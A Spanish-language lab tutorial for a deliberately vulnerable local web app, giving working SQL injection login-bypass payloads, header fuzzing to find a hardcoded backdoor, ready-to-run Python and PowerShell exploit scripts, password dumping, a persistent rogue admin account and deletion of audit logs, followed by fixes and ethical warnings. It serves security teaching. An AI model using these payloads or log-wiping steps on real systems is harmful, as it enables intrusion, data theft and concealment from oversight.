# Gu铆a de Explotaci贸n - Honeypot Security Lab

Esta gu铆a muestra paso a paso c贸mo explotar las vulnerabilidades del honeypot con fines educativos.

---

## Tabla de Contenidos

1. [Reconocimiento Inicial](#reconocimiento-inicial)
2. [Explotaci贸n SQL Injection](#explotaci贸n-sql-injection)
3. [Descubrimiento del Backdoor](#descubrimiento-del-backdoor)
4. [Escalaci贸n de Privilegios](#escalaci贸n-de-privilegios)
5. [Post-Explotaci贸n](#post-explotaci贸n)

---

## Reconocimiento Inicial

### Paso 1: Identificar el Target

```bash
# Verificar que el servidor est谩 activo
curl http://localhost:3000/health

# Respuesta esperada:
# {"status":"OK","message":"Honeypot is running","timestamp":"..."}
```

### Paso 2: Enumerar Endpoints

```bash
# Acceder al endpoint ra铆z
curl http://localhost:3000/

# Respuesta revelar谩 informaci贸n:
{
  "message": "Honeypot Security Lab API",
  "warning": "This is a vulnerable application for educational purposes",
  "endpoints": {
    "auth": "/api/auth/login, /api/auth/register",
    "admin": "/api/admin/*"
  },
  "hints": {
    "weak_credentials": "Try common passwords",
    "sql_injection": "Login form may not sanitize inputs",
    "dev_access": "Developers sometimes leave backdoors..."
  }
}
```

### Paso 3: Inspeccionar Frontend (si disponible)

```bash
# Si hay frontend, buscar en el c贸digo fuente HTML
curl http://localhost:5173/ | grep -i "comment\|TODO\|FIXME\|XXX"

# Buscar comentarios HTML que revelen informaci贸n:
<!--
  DEV NOTE: Para bypass de autenticaci贸n en desarrollo,
  usar header: X-AccessDev: Testing-Mode
-->
```

---

## Explotaci贸n SQL Injection

### Ataque 1: Comment-Based Bypass

**Objetivo:** Hacer login como admin sin conocer la password

**Payload:** `admin'--`

```bash
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "admin'\''--",
    "password": "cualquiercosa"
  }'
```

**驴Por qu茅 funciona?**

El c贸digo vulnerable concatena strings directamente:

```sql
SELECT * FROM users WHERE username = 'admin'-- AND password = 'cualquiercosa'
```

El `--` comenta el resto de la query, ignorando la validaci贸n de password.

**Resultado:**

```json
{
    "message": "Login successful",
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
    "user": {
        "id": 1,
        "username": "admin",
        "email": "admin@honeypot.local",
        "role": "admin"
    }
}
```

### Ataque 2: Always True Condition

**Payload:** `' OR '1'='1`

```bash
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "'\'' OR '\''1'\''='\''1",
    "password": "anything"
  }'
```

**Query resultante:**

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'anything'
```

Esto retorna el **primer usuario** en la tabla (generalmente admin).

### Ataque 3: UNION-Based SQL Injection

**Payload:** `' UNION SELECT 1,2,3,4,5,6,7,8,9--`

```bash
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "'\'' UNION SELECT 1,'\''admin'\'','\''admin@hack.com'\'','\''hacked'\'','\''admin'\'',1,NULL,NULL,NULL--",
    "password": "x"
  }'
```

**Objetivo:** Inyectar un usuario falso en la respuesta.

### Ataque 4: Enumeraci贸n de Usuarios

```bash
# Verificar si existe el usuario "admin"
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\''--","password":"x"}'

# Verificar si existe "root"
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"root'\''--","password":"x"}'

# Verificar si existe "administrator"
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"administrator'\''--","password":"x"}'
```

Si retorna token = **usuario existe**
Si retorna error = **usuario no existe**

---

## Descubrimiento del Backdoor

### M茅todo 1: An谩lisis de C贸digo Fuente (White Box)

Si tienes acceso al c贸digo:

```javascript
// En authMiddleware.js
if (req.headers["x-accessdev"] === "Testing-Mode") {
    req.user = { id: 0, username: "BACKDOOR", role: "admin" };
    return next();
}
```

### M茅todo 2: Fuzzing de Headers (Black Box)

```bash
# Lista de headers comunes para backdoors
headers=(
  "X-Debug: true"
  "X-Dev-Mode: true"
  "X-Admin: true"
  "X-AccessDev: Testing-Mode"
  "X-Developer: true"
  "Authorization-Bypass: secret"
)

# Probar cada header
for header in "${headers[@]}"; do
  echo "Testing: $header"
  curl -H "$header" http://localhost:3000/api/admin/users
done
```

### M茅todo 3: B煤squeda en Documentaci贸n/C贸digo Frontend

```bash
# Buscar en archivos HTML/JS
grep -r "X-" front/public/
grep -r "header" front/src/ | grep -i "dev\|admin\|bypass"

# Buscar en variables de entorno
cat .env.example | grep -i "header\|backdoor\|dev"
```

### M茅todo 4: An谩lisis de Respuestas del Servidor

```bash
# Enviar request sin autenticaci贸n
curl -v http://localhost:3000/api/admin/users 2>&1 | grep -i "header\|hint"

# El servidor podr铆a revelar hints en headers de respuesta
```

---

##  Uso del Backdoor

### Acceso B谩sico

```bash
# Listar todos los usuarios (sin JWT)
curl http://localhost:3000/api/admin/users \
  -H "X-AccessDev: Testing-Mode"
```

**Respuesta:**

```json
{
  "message": "Users retrieved successfully",
  "count": 8,
  "users": [
    {
      "id": 1,
      "username": "admin",
      "email": "admin@honeypot.local",
      "role": "admin",
      "is_active": 1,
      "created_at": "2024-12-01T00:00:00.000Z",
      "last_login": null,
      "login_attempts": 0
    },
    ...
  ],
  "accessedBy": "BACKDOOR ACCESS",
  "warning": "This endpoint bypassed authentication!"
}
```

### Obtener Estad铆sticas

```bash
curl http://localhost:3000/api/admin/stats \
  -H "X-AccessDev: Testing-Mode"
```

**Respuesta:**

```json
{
    "message": "Database statistics",
    "stats": {
        "users": 8,
        "products": 6,
        "orders": 3,
        "audit_logs": 15
    },
    "accessedBy": "BACKDOOR ACCESS"
}
```

### Acceder a Logs de Auditor铆a

```bash
# ltimos 20 logs
curl http://localhost:3000/api/admin/audit-logs?limit=20 \
  -H "X-AccessDev: Testing-Mode"
```

**Informaci贸n revelada:**

-   Todos los logins
-   Acciones de usuarios
-   **Registros de uso del backdoor** (meta!)
-   IPs y User-Agents

### Eliminar Usuario

```bash
# Eliminar usuario con ID 8 (guest)
curl -X DELETE http://localhost:3000/api/admin/users/8 \
  -H "X-AccessDev: Testing-Mode"
```

**Advertencia:** Esto elimina permanentemente el usuario de la BD.

---

## Escalaci贸n de Privilegios

### Escenario: Eres un usuario normal, necesitas privilegios admin

### Paso 1: Registrar Usuario Normal

```bash
curl -X POST http://localhost:3000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "username": "hacker",
    "email": "hacker@test.com",
    "password": "password123"
  }'
```

### Paso 2: Login Normal

```bash
TOKEN=$(curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"password123"}' \
  | jq -r '.token')
```

### Paso 3: Intentar Acceso Admin (Fallar谩)

```bash
curl http://localhost:3000/api/admin/users \
  -H "Authorization: Bearer $TOKEN"

# Respuesta: 403 Forbidden - Insufficient permissions
```

### Paso 4: Usar Backdoor para Acceso Admin

```bash
# Bypass completo - no necesitas tu token
curl http://localhost:3000/api/admin/users \
  -H "X-AccessDev: Testing-Mode"

# Acceso concedido como admin
```

### Paso 5: Modificar BD Directamente (si tienes acceso a MySQL)

```bash
# Usando phpMyAdmin o MySQL CLI
docker exec -it honeypot-mysql mysql -u root -pvulnerable123 honeypot_db

# Cambiar tu rol a admin
UPDATE users SET role = 'admin' WHERE username = 'hacker';
```

---

## Post-Explotaci贸n

### 1. Dump de Toda la Base de Datos

```bash
# Exportar usuarios
curl http://localhost:3000/api/admin/users \
  -H "X-AccessDev: Testing-Mode" \
  | jq '.users[] | {username, email, password, role}' > users_dump.json

# Ver contrase帽as en texto plano
cat users_dump.json
```

### 2. An谩lisis de Logs

```bash
# Buscar accesos sospechosos
curl http://localhost:3000/api/admin/audit-logs?limit=100 \
  -H "X-AccessDev: Testing-Mode" \
  | jq '.logs[] | select(.action == "backdoor_access")'

# Contar usos del backdoor
curl http://localhost:3000/api/admin/audit-logs?limit=1000 \
  -H "X-AccessDev: Testing-Mode" \
  | jq '[.logs[] | select(.action == "backdoor_access")] | length'
```

### 3. Persistencia

```bash
# Crear nuevo usuario admin (usando backdoor)
# Primero registrar usuario normal
curl -X POST http://localhost:3000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "username": "backdoor_user",
    "email": "backdoor@evil.com",
    "password": "SecretPass123!"
  }'

# Luego modificar en BD directamente para hacerlo admin
docker exec -it honeypot-mysql mysql -u root -pvulnerable123 -e \
  "UPDATE honeypot_db.users SET role='admin' WHERE username='backdoor_user';"

# Ahora puedes hacer login normal con privilegios admin
```

### 4. Borrar Rastros

```bash
# Ver tus accesos en audit_log
curl http://localhost:3000/api/admin/audit-logs?limit=50 \
  -H "X-AccessDev: Testing-Mode" \
  | jq '.logs[] | select(.action == "backdoor_access")'

# Eliminar logs (requiere acceso directo a BD)
docker exec -it honeypot-mysql mysql -u root -pvulnerable123 -e \
  "DELETE FROM honeypot_db.audit_log WHERE action='backdoor_access';"
```

---

## Automatizaci贸n con Scripts

### Script Python: Explotaci贸n Autom谩tica

```python
#!/usr/bin/env python3
import requests

BASE_URL = "http://localhost:3000"
BACKDOOR_HEADER = {"X-AccessDev": "Testing-Mode"}

# 1. SQL Injection Login
print("[+] Testing SQL Injection...")
response = requests.post(
    f"{BASE_URL}/api/auth/login",
    json={"username": "admin'--", "password": "anything"}
)
if response.status_code == 200:
    print(f"[OK] SQL Injection successful! Token: {response.json()['token'][:50]}...")
else:
    print("[FAIL] SQL Injection failed")

# 2. Backdoor Access
print("\n[+] Testing Backdoor...")
response = requests.get(
    f"{BASE_URL}/api/admin/users",
    headers=BACKDOOR_HEADER
)
if response.status_code == 200:
    users = response.json()
    print(f"[OK] Backdoor successful! Retrieved {users['count']} users")
    for user in users['users']:
        print(f"  - {user['username']} ({user['role']}): {user['email']}")
else:
    print("[FAIL] Backdoor failed")

# 3. Database Stats
print("\n[+] Getting database stats...")
response = requests.get(
    f"{BASE_URL}/api/admin/stats",
    headers=BACKDOOR_HEADER
)
if response.status_code == 200:
    stats = response.json()['stats']
    print(f"[OK] Stats retrieved:")
    print(f"  - Users: {stats['users']}")
    print(f"  - Products: {stats['products']}")
    print(f"  - Orders: {stats['orders']}")
    print(f"  - Audit Logs: {stats['audit_logs']}")

print("\n[OK] Explotaci贸n completada!")
```

Guardar como `exploit.py` y ejecutar:

```bash
chmod +x exploit.py
./exploit.py
```

### Script PowerShell: Explotaci贸n en Windows

```powershell
# exploit.ps1
$baseUrl = "http://localhost:3000"
$backdoorHeader = @{ "X-AccessDev" = "Testing-Mode" }

Write-Host "`n[+] Starting exploitation..." -ForegroundColor Cyan

# 1. SQL Injection
Write-Host "`n[+] Testing SQL Injection..." -ForegroundColor Yellow
$body = @{ username = "admin'--"; password = "anything" } | ConvertTo-Json
try {
    $response = Invoke-RestMethod -Uri "$baseUrl/api/auth/login" -Method POST -Body $body -ContentType "application/json"
    Write-Host "[OK] SQL Injection successful!" -ForegroundColor Green
    Write-Host "    Token: $($response.token.Substring(0,50))..." -ForegroundColor White
} catch {
    Write-Host "[FAIL] SQL Injection failed" -ForegroundColor Red
}

# 2. Backdoor
Write-Host "`n[+] Testing Backdoor..." -ForegroundColor Yellow
try {
    $users = Invoke-RestMethod -Uri "$baseUrl/api/admin/users" -Headers $backdoorHeader
    Write-Host "[OK] Backdoor successful! Retrieved $($users.count) users" -ForegroundColor Green
    foreach ($user in $users.users) {
        Write-Host "    - $($user.username) ($($user.role)): $($user.email)" -ForegroundColor White
    }
} catch {
    Write-Host "[FAIL] Backdoor failed" -ForegroundColor Red
}

Write-Host "`n[OK] Exploitation completed!" -ForegroundColor Green
```

---

## Ejercicios Propuestos

### Nivel B谩sico

1. Hacer login como admin sin conocer la contrase帽a (SQL Injection)
2. Descubrir el header del backdoor
3. Listar todos los usuarios usando el backdoor

### Nivel Intermedio

4. Encontrar todas las contrase帽as en texto plano
5. Crear un script que automatice la explotaci贸n
6. Modificar la BD para crear un nuevo admin

### Nivel Avanzado

7. Analizar los logs y encontrar todos los accesos por backdoor
8. Implementar un fix para cada vulnerabilidad
9. Crear un informe de pentesting completo

---

## Mitigaciones (C贸mo Arreglar las Vulnerabilidades)

### Fix SQL Injection

**Antes (vulnerable):**

```javascript
const query = `SELECT * FROM users WHERE username = '${username}'`;
const [users] = await executeRawQuery(query);
```

**Despu茅s (seguro):**

```javascript
const query = "SELECT * FROM users WHERE username = ?";
const [users] = await executeQuery(query, [username]);
```

### Fix Contrase帽as en Texto Plano

**Implementar hashing:**

```javascript
const bcrypt = require("bcryptjs");

// Al registrar
const hashedPassword = await bcrypt.hash(password, 10);

// Al hacer login
const isValid = await bcrypt.compare(password, user.password);
```

### Fix Backdoor

**Eliminar completamente:**

```javascript
// Borrar src/middlewares/backdoorMiddleware.js
// Remover el check del backdoor en authMiddleware.js
```

### Agregar Rate Limiting

```javascript
const rateLimit = require("express-rate-limit");

const loginLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutos
    max: 5, // 5 intentos
    message: "Too many login attempts",
});

app.post("/api/auth/login", loginLimiter, authController.login);
```

---

## Checklist de Explotaci贸n

-   Reconocimiento inicial del target
-   Enumerar endpoints disponibles
-   Probar SQL Injection en login
-   Obtener token JWT v谩lido
-   Buscar comentarios en frontend revelando informaci贸n
-   Descubrir header del backdoor
-   Acceder a endpoints admin sin autenticaci贸n
-   Dump de usuarios y contrase帽as
-   Analizar logs de auditor铆a
-   Crear usuario admin persistente
-   Documentar todas las vulnerabilidades encontradas

---

## Advertencias Finales

1. **Solo usar en entornos aislados** - Nunca en producci贸n
2. **Pedir permiso** - Solo pentesting 茅tico con autorizaci贸n
3. **Aprender responsablemente** - El objetivo es aprender defensa, no atacar
4. **No exponer a internet** - Mantener en red local/Docker

---

## Recursos Adicionales

-   [OWASP Top 10](https://owasp.org/www-project-top-ten/)
-   [PortSwigger Web Security Academy](https://portswigger.net/web-security)
-   [HackTheBox](https://www.hackthebox.com/)
-   [TryHackMe](https://tryhackme.com/)

---

**Happy Hacking!**

_Recuerda: Con gran poder viene gran responsabilidad._
